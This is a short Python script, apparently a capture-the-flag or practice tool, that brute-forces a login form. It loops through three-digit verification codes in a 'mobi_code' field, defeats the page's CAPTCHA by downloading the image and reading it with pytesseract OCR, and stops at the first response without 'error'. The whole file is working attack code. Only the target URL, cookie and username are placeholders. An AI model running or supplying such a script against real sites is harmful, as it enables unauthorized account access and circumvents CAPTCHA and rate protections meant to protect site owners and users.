#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Date: 2017/03/06
# Created by FireEgret

from urllib import request, parse
import re
from PIL import Image
import pytesseract

url = 'xxxxx/login.php'


def vcode():
    pic_url="http://xxxx/vcode.php"
    req2 = request.Request(pic_url)
    req2.add_header('Cookie', 'xxxx')

    with request.urlopen(req2) as f:

        with open("vcode.png","wb") as pic:
            pic.write(f.read())

    img = Image.open('vcode.png')
    im = pytesseract.image_to_string(img)

    im = im.replace(' ', '')
    if im != '':
        return im
    else:
        return vcode()

# print(vcode())
for password in range(100,1000):

    req = request.Request(url)
    req.add_header('Cookie', 'xxxx')
    user_vcode = vcode()
    post_data=parse.urlencode([
        ('username','xxxxx'),
        #('pwd',password),
        ('mobi_code',password),
        ('user_code',user_vcode),
        ('Login','submit')
    ])
    print(password,user_vcode)
    with request.urlopen(req,data=post_data.encode('utf-8')) as f:
        data=f.read()
        #key=re.findall(re.compile(r'(.*)'),data.decode('utf-8'))
        # if('error' not in data.decode('utf-8')):
        #     print(data.decode('utf-8'))
        #     break;
        if 'error' not in data.decode('utf-8'):
            print(data.decode('utf-8'))
            break
